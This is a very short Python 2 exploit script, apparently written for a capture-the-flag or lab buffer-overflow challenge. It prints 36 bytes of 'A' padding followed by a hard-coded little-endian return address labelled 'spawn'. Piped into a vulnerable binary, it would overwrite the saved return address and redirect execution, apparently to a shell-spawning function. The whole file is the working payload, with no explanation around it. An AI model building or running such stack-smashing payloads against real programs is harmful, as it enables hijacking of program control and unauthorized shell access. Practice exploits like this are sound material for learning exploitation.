#!/usr/bin/python2

offset = 36
junk = b"A" * offset

spawn = b"\xe9\x61\x55\x56"

print(junk + spawn)
